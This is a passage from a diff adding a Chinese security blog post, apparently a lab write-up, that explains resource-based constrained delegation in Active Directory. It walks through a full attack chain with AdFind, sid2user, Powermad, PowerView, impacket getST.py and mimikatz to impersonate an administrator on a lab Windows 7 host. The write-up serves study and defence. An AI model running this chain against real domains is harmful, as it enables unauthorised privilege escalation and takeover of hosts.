+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-064120.png"
+                      alt="image-20230426144119862"
+                ></p>
+<p>不然会报错</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-064152.png"
+                      alt="image-20230426144152240"
+                ></p>
+<p>以后遇到这种错误就可能是没有将域名加入到hosts</p>
+<p>加入之后</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-064222.png"
+                      alt="image-20230426144221973"
+                ></p>
+<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>​    为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p>
+<p>​    上面”基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员”，这就导致了正常只要是域用户都有权限进行委派操作。</p>
+<p>​    与约束委派最大的不同点，就是”基于资源”这四个字，如何理解”基于资源”？在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p>
+<h5 id="基于资源的约束性委派的优势"><a href="#基于资源的约束性委派的优势" class="headerlink" title="基于资源的约束性委派的优势"></a>基于资源的约束性委派的优势</h5><ul>
+<li>委派的权限授予给了拥有资源的后端，而不再是前端</li>
+<li>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</li>
+<li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限也就是将计算机加入域的域用户和机器自身拥有权限。</li>
+</ul>
+<h5 id="约束性委派和基于资源的约束性委派配置的差别"><a href="#约束性委派和基于资源的约束性委派配置的差别" class="headerlink" title="约束性委派和基于资源的约束性委派配置的差别"></a>约束性委派和基于资源的约束性委派配置的差别</h5><ul>
+<li>传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</li>
+<li>而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</li>
+<li>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户（也就是我们创建的机器账户或已知机器账户）</li>
+</ul>
+<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ol>
+<li>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限(如已经控制的主机是WEB 则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)</li>
+<li>可以创建机器账户的域用户（或已知机器账户）</li>
+</ol>
+<h5 id="什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性："><a href="#什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：" class="headerlink" title="什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性："></a><strong>什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：</strong></h5><ul>
+<li>将主机加入域的用户(账户中有一个<code>mSDS-CreatorSID</code>属性，用于标记加入域时使用的用户的SID值，反查就可以知道是谁把机器加入域的了)</li>
+<li>Account Operator组成员</li>
+<li>该主机的机器账户</li>
+</ul>
+<h5 id="什么是将机器加入域的域用户？"><a href="#什么是将机器加入域的域用户？" class="headerlink" title="什么是将机器加入域的域用户？"></a><strong>什么是将机器加入域的域用户？</strong></h5><p>​    因为将一个机器加入域的时候不是要输入一个域用户的账户密码吗 就是输入的这个用户</p>
+<p>​    如果一个域环境 域用户A 将域内win2012 和 win7 加入了域 我们拿到了域用户A的权限 就可以拿下win2012 和 win7</p>
+<p>​    如果我们拿到了Account Operators组内用户权限的话，则我们可以拿到除域控外所有机器的system权限。<em>（因为Account Operators组内用户可以修改域内任意主机（除了域控）的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性）</em></p>
+<p>​    这里因为刚开始没有用many加入域用的是域控就重新设置一下机器 先脱域 然后重新加入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-071139.png"
+                      alt="image-20230426151139381"
+                ></p>
+<p>然后委派这些也都删除</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-071205.png"
+                      alt="image-20230426151204755"
+                ></p>
+<h5 id="查询把WEB加入域的用户"><a href="#查询把WEB加入域的用户" class="headerlink" title="查询把WEB加入域的用户"></a>查询把WEB加入域的用户</h5><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-071344.png"
+                      alt="image-20230426151343718"
+                ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.150.127.166 -b &quot;DC=haishi,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>
+
+<p>当前登录的是域用户many ip是域控的166</p>
+<p>这里可以看到一个sid：S-1-5-21-1400638014-602433399-2258725660-1146</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-071405.png"
+                      alt="image-20230426151405008"
+                ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sid2user.exe \\10.150.127.166 5 21 1400638014 602433399 2258725660 1146</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 用户是many</p>
+<p>WEB是被many加入域的</p>
+<h5 id="基于资源的约束委派攻击原理及利用"><a href="#基于资源的约束委派攻击原理及利用" class="headerlink" title="基于资源的约束委派攻击原理及利用"></a><strong>基于资源的约束委派攻击原理及利用</strong></h5><h6 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h6><p>当我们知道资源的约束委派攻击的简要后就可以知道：资源的约束委派不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，说白了其实就是：<strong>计算机加入域时，加入域的域用户和被加入域的域机器自身拥有权限。</strong></p>
+<p>换句话说如果我们拥有配置某台主机 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限与创建机器账户的权限，那我们就相当于拿到了此机器的所有权限。至于为什么是机器账户，而不能是普通用户的账户，因为攻击的时候会利用到 <code>S4U2Self</code> 协议，而它只适用于具有 <code>SPN</code> 的账户，普通账户是没有 <code>SPN</code> 的，而机器账户是有的。</p>
+<p>那么大家思考下，谁有修改某台主机 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的权限呢？</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-085854.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-085855.png"
+                      alt="img"
+                ></p>
+<p>看上面这两张图，**<code>win7</code> （机器名）这台机器在加域的时候填写的域内账户是 <code>saulgoodman</code>，那么 <code>saulgoodman</code> 这个域用户就有修改 <code>win7</code> （机器名）这台主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的权限**。</p>
+<p><strong>在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如上图的 saulgoodman 就是一个加域用户）去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</strong></p>
+<p>所以如何想利用基于资源的约束性委派进行攻击的话就需要如下两个点：</p>
+<ul>
+<li>一个机器账户</li>
+</ul>
+<p>域内用户都有一个属性叫做 <code>ms-ds-MachineAccountQuota</code>，它代表的是允许用户在域中常见计算机账户的个数，默认是10。那么这就代表我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户也就是机器账户。</p>
+<ul>
+<li>一个有权利修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的账户</li>
+</ul>
+<p><strong>攻击者可以查询域内计算机的 <code>mS-DS-CreatorSID</code>，这个值代表的是将计算机加入到域内的用户，它是具有修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限的，如果我们可以拿到那个用户的凭据，就可以控制那个用户添加到域内的所有的电脑。</strong></p>
+<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a><strong>攻击利用</strong></h3><p>saulgoodman.cn 域环境：</p>
+<table>
+<thead>
+<tr>
+<th align="left">角色</th>
+<th align="left">机器 IP</th>
+<th align="left">主机名</th>
+<th align="left">服务器类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">saulgoodman\administrator</td>
+<td align="left">10.0.0.12</td>
+<td align="left">AD-2012</td>
+<td align="left">Windows 2012 R2（域控）</td>
+</tr>
+<tr>
+<td align="left">saulgoodman\redteam-iis</td>
+<td align="left">10.0.0.8</td>
+<td align="left">Web-2008</td>
+<td align="left">Windows 2008（被控的跳板机，所有攻击都在这个机器里完成）</td>
+</tr>
+<tr>
+<td align="left">saulgoodman\saulgoodman</td>
+<td align="left">10.0.0.7</td>
+<td align="left">Win7</td>
+<td align="left">Windows 7（受害机器）</td>
+</tr>
+</tbody></table>
+<p><strong>其中 saulgoodman 这个域用户就是加域用户</strong>，当我们拿下一台机器权限，发现是在域环境，然后在电脑里发现 saulgoodman 域用户的账号密码，因为需要 saulgoodman 域用户将其他机器加入到域环境里，所以有可能会获得到 saulgoodman 的账号密码。</p>
+<p>然后发现当前域用户并不在本地管理组里，就可以通过 saulgoodman 域用户提权到 adminsitrator。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-90644.png"
+                      alt="img"
+                ></p>
+<p>由上图可见，当前域用户 saulgoodman 不是 win7 机器的本地管理员。</p>
+<p>在 saulgoodman.cn 域中，saulgoodman 域用户负责将 web-2008 的机器或者 Win7 机器加入到 saulgoodman.cn 域里，那么当我们拿下 saulgoodman 这个域用户的权限后，就可以拿下域内 web-2008 的域机器和 win7的域机器。</p>
+<p>假设我们已经获取到加域机器的 saulgoodman 的账户密码：</p>
+<table>
+<thead>
+<tr>
+<th align="left">用户名</th>
+<th align="left">密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">saulgoodman\saulgoodman</td>
+<td align="left">admin!@#45</td>
+</tr>
+</tbody></table>
+<p>1、通过 ADfind 查询每个域机器是由哪个域用户添加进域的，通过 <code>mS-DS-CreatorSID</code> 查看域用户的 <code>sid</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:\<span class="title class_">Users</span>\saulgoodman\<span class="title class_">Desktop</span>&gt;<span class="title class_">AdFind</span>.<span class="property">exe</span> -h <span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span> -u saulgoodman -up admin!@#<span class="number">45</span> -b <span class="string">&quot;DC=saulgoodman,DC=cn&quot;</span> -f <span class="string">&quot;objectClass=computer&quot;</span> mS-<span class="variable constant_">DS</span>-<span class="title class_">CreatorSID</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">AdFind</span> <span class="variable constant_">V01</span><span class="number">.52</span>.00cpp <span class="title class_">Joe</span> <span class="title class_">Richards</span> (support@joeware.<span class="property">net</span>) <span class="title class_">January</span> <span class="number">2020</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Using</span> <span class="attr">server</span>: <span class="variable constant_">AD</span>-<span class="number">2012.</span>saulgoodman.<span class="property">cn</span>:<span class="number">389</span></span><br><span class="line"><span class="title class_">Directory</span>: <span class="title class_">Windows</span> <span class="title class_">Server</span> <span class="number">2012</span> <span class="variable constant_">R2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dn</span>:<span class="variable constant_">CN</span>=<span class="variable constant_">AD</span>-<span class="number">2012</span>,<span class="variable constant_">OU</span>=<span class="title class_">Domain</span> <span class="title class_">Controllers</span>,<span class="variable constant_">DC</span>=saulgoodman,<span class="variable constant_">DC</span>=cn</span><br><span class="line"></span><br><span class="line"><span class="attr">dn</span>:<span class="variable constant_">CN</span>=<span class="variable constant_">WEB</span>-<span class="number">2008</span>,<span class="variable constant_">CN</span>=<span class="title class_">Computers</span>,<span class="variable constant_">DC</span>=saulgoodman,<span class="variable constant_">DC</span>=cn</span><br><span class="line"></span><br><span class="line"><span class="attr">dn</span>:<span class="variable constant_">CN</span>=<span class="title class_">WIN7</span>,<span class="variable constant_">CN</span>=<span class="title class_">Computers</span>,<span class="variable constant_">DC</span>=saulgoodman,<span class="variable constant_">DC</span>=cn</span><br><span class="line">&gt;mS-<span class="variable constant_">DS</span>-<span class="title class_">CreatorSID</span>: S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3258976832</span>-<span class="number">1609833424</span>-<span class="number">2410015844</span>-<span class="number">1108</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="title class_">Objects</span> returned</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090646.png"
+                      alt="img"
+                ></p>
+<p>得到 win7 机器是 sid：<code>S-1-5-21-3258976832-1609833424-2410015844-1108</code> 的用户加入到域的。</p>
+<p>那么问题来了，我们怎么知道 <code>S-1-5-21-3258976832-1609833424-2410015844-1108</code> 是那个域用户的 sid 呢？</p>
+<p>2、若是想要查询每个域用户的 sid 就可以使用 sid2user 来帮助我们完成：（需要把 <code>-</code> 去掉）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sid2user.<span class="property">exe</span> \\<span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span> <span class="number">5</span> <span class="number">21</span> <span class="number">3258976832</span> <span class="number">1609833424</span> <span class="number">2410015844</span> <span class="number">1108</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Name</span> is saulgoodman</span><br><span class="line"><span class="title class_">Domain</span> is <span class="variable constant_">SAULGOODMAN</span></span><br><span class="line"><span class="title class_">Type</span> <span class="keyword">of</span> <span class="variable constant_">SID</span> is <span class="title class_">SidTypeUser</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090647.png"
+                      alt="img"
+                ></p>
+<p>这个时候就知道了 sid：<code>S-1-5-21-3258976832-1609833424-2410015844-1108</code> 是域用户 saulgoodman 。</p>
+<p><strong>我们需要添加一个机器用户，因为需要用机器用户去申请票据，本身的 win7 机器账户我们不知道他的密码所以无法申请票据，所以我们需要添加一个机器用户，用来帮助我们申请票据。</strong></p>
+<p>3、然后利用 powermad 添加机器账户：</p>
+<p>下载地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad" >https://github.com/Kevin-Robertson/Powermad<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 添加用户 goodman 密码 <span class="number">123456</span></span><br><span class="line">powershell</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">ExecutionPolicy</span> <span class="title class_">Bypass</span> -<span class="title class_">Scope</span> <span class="title class_">Process</span></span><br><span class="line"> . .\<span class="title class_">Powermad</span>.<span class="property">ps1</span></span><br><span class="line"><span class="title class_">New</span>-<span class="title class_">MachineAccount</span> -<span class="title class_">MachineAccount</span> goodman -<span class="title class_">Password</span> $(<span class="title class_">ConvertTo</span>-<span class="title class_">SecureString</span> <span class="string">&quot;123456&quot;</span> -<span class="title class_">AsPlainText</span> -<span class="title class_">Force</span>)</span><br><span class="line"># 验证是否添加成功</span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090643.png"
+                      alt="img"
+                ></p>
+<p>此时就有了一个域机器账户 goodman:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090648.png"
+                      alt="img"
+                ></p>
+<p>4、获取 goodman 的 <strong>object Sid</strong>：得到了 sid 为：<code>S-1-5-21-3258976832-1609833424-2410015844-1116</code>。</p>
+<p>下面是修改 win7 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的值，使用<code>Powerview</code> ：<a class="link"   target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" >https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1<i class="fas fa-external-link-alt"></i></a></p>
+<p>5、配置 goodman 到 win7 的基于资源约束的委派:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line"><span class="title class_">Set</span>-<span class="title class_">ExecutionPolicy</span> <span class="title class_">Bypass</span> -<span class="title class_">Scope</span> <span class="title class_">Process</span></span><br><span class="line">. .\powerview.<span class="property">ps1</span></span><br><span class="line">$SD = <span class="title class_">New</span>-<span class="title class_">Object</span> <span class="title class_">Security</span>.<span class="property">AccessControl</span>.<span class="property">RawSecurityDescriptor</span> -<span class="title class_">ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3258976832-1609833424-2410015844-1116)&quot;</span></span><br><span class="line">$SDBytes = <span class="title class_">New</span>-<span class="title class_">Object</span> byte[] ($SD.<span class="property">BinaryLength</span>)</span><br><span class="line">$SD.<span class="title class_">GetBinaryForm</span>($SDBytes, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">Get</span>-<span class="title class_">DomainComputer</span> win7| <span class="title class_">Set</span>-<span class="title class_">DomainObject</span> -<span class="title class_">Set</span> @&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=$SDBytes&#125; -<span class="title class_">Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090649.png"
+                      alt="img"
+                ></p>
+<p>验证是否成功添加：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Get</span>-<span class="title class_">DomainComputer</span> win7 -<span class="title class_">Properties</span> msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090644.png"
+                      alt="img"
+                ></p>
+<p>若想清除 <code>msds-allowedtoactonbehalfofotheridentity</code> 属性的值，可用如下命令：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">DomainObject</span> win7 -<span class="title class_">Clear</span> <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -<span class="title class_">Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p>6、使用 impacket的 getST.py 生成票据（建议使用 socks5），会在当前目录下生成 administrator.ccache 文件：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.<span class="property">py</span> -dc-ip <span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span> saulgoodman.<span class="property">cn</span>/goodman\<span class="attr">$</span>:<span class="number">123456</span> -spn cifs/win7.<span class="property">saulgoodman</span>.<span class="property">cn</span> -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-090645.png"
+                      alt="img"
+                ></p>
+<p>7、之后使用 mimikatz 导入票据：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kerberos</span>::ptc administrator.<span class="property">ccache</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-90647.png"
+                      alt="img"
+                ></p>
+<p>此时就能成功访问 Win7 了，这就是基于资源的约束委派攻击利用的整个流程。</p>
+
         </div>
 
         
@@ -1695,7 +2167,7 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="nav-number">2.</span> <span class="nav-text">本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">本地认证基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-NT-LAN-Manager-Hash"><span class="nav-number">2.2.</span> <span class="nav-text">NTLM(NT LAN Manager) Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash%E4%B8%8ENTLM"><span class="nav-number">2.3.</span> <span class="nav-text">NTLM Hash与NTLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="nav-number">2.4.</span> <span class="nav-text">NTLM Hash的产生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">2.5.</span> <span class="nav-text">本地认证流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LM-Hash"><span class="nav-number">2.6.</span> <span class="nav-text">LM Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="nav-number">3.</span> <span class="nav-text">网络认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.1.</span> <span class="nav-text">NTLM 协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-%E6%8C%91%E6%88%98-Response-%E5%93%8D%E5%BA%94"><span class="nav-number">3.2.</span> <span class="nav-text">Challenge(挑战)&#x2F;Response(响应)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-V2%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.3.</span> <span class="nav-text">NTLM V2协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM%E5%8D%8F%E8%AE%AE%E5%BB%B6%E4%BC%B8"><span class="nav-number">3.4.</span> <span class="nav-text">NTLM协议延伸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-number">3.5.</span> <span class="nav-text">Pass The Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81"><span class="nav-number">4.</span> <span class="nav-text">Kerberos域认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-Directory-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-%E6%A6%82%E5%BF%B5"><span class="nav-number">4.1.</span> <span class="nav-text">Active Directory(活动目录)概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-Directory-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-%E5%8A%9F%E8%83%BD"><span class="nav-number">4.2.</span> <span class="nav-text">Active Directory(活动目录)功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB-Kerbroes"><span class="nav-number">4.3.</span> <span class="nav-text">域认证体系 - Kerbroes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%89%80%E5%8F%82%E4%B8%8E%E7%9A%84%E8%A7%92%E8%89%B2"><span class="nav-number">4.4.</span> <span class="nav-text">域认证所参与的角色</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%89%80%E5%8F%82%E4%B8%8E%E7%9A%84%E8%A7%92%E8%89%B2%EF%BC%88KDC%EF%BC%89"><span class="nav-number">4.5.</span> <span class="nav-text">域认证所参与的角色（KDC）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%B2%97%E7%95%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">4.6.</span> <span class="nav-text">域认证粗略流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B"><span class="nav-number">4.7.</span> <span class="nav-text">域认证详细流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets"><span class="nav-number">4.8.</span> <span class="nav-text">白银票据(Silver Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets"><span class="nav-number">4.9.</span> <span class="nav-text">伪造白银票据(Silver Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets-%E9%98%B2%E5%BE%A1"><span class="nav-number">4.10.</span> <span class="nav-text">白银票据(Silver Tickets)防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets"><span class="nav-number">4.11.</span> <span class="nav-text">黄金票据(Golden Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets-MSF-kiwi"><span class="nav-number">4.12.</span> <span class="nav-text">黄金票据(Golden Tickets)-MSF kiwi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets-%E4%BC%AA%E9%80%A0"><span class="nav-number">4.13.</span> <span class="nav-text">黄金票据(Golden Tickets) - 伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tickets-%E6%80%BB%E7%BB%93"><span class="nav-number">4.14.</span> <span class="nav-text">Tickets 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Access-Token"><span class="nav-number">5.</span> <span class="nav-text">Windows Access Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token-%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">Windows Access Token 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E7%BB%84%E6%88%90"><span 